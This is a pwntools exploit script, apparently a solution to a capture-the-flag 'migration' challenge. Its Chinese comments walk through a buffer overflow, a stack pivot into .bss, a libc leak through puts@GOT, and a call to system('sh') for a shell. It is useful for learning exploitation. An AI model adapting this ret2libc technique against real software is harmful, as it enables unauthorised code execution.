#! /usr/bin/python
# -*- coding: utf-8 -*-
# vim:fenc=utf-8
#
# Copyright © 2018 howpwn <finn79426@gmail.com>
#
# Distributed under terms of the MIT license.

from pwn import *
import time
# context.log_level = "debug"
p = process("./migration")

p.recvuntil("\n")

# padding 44 蓋掉 EIP
# 蓋掉 ret 後，還剩 16 byte (4 個 gadget)
rop1 = cyclic(40)

buf = 0x804ae00
buf2 = buf + 0x100
read_plt = 0x8048380
puts_plt = 0x8048390
leave_ret = 0x08048418
puts_got = 0x8049ff0
pop_ret = 0x0804836d

# ebp = buf, ret = read_plt, leave ; ret
rop1 += flat([buf, read_plt, leave_ret, 0, buf, 100]) # read(0, buf, 1000)
p.send(rop1) # 加上 "\n" 會超過可輸入大小

# ebp = buf2, ret = puts(puts_got)
# pop_ret 清掉 puts_got 佔的位置以便接下來執行 read(0, buf, 100)
# 註：一定要搭配 pop ，不可單獨使用 ret ，它會把 puts_got 做執行 => 沒用
rop2 = flat([buf2,puts_plt,pop_ret,puts_got,read_plt,leave_ret,0,buf2,100])
p.sendline(rop2)

real_puts = u32(p.recvuntil("\n")[:-1])
libc = real_puts - 0x5fca0
system = libc + 0x3ada0

print "libc_addr :", hex(libc)

sh = buf2 + 4*4
rop3 = flat([buf, system, 0, sh, "sh"]) # 此段 gadget 在 buf2 後面

p.sendline(rop3)
p.interactive()
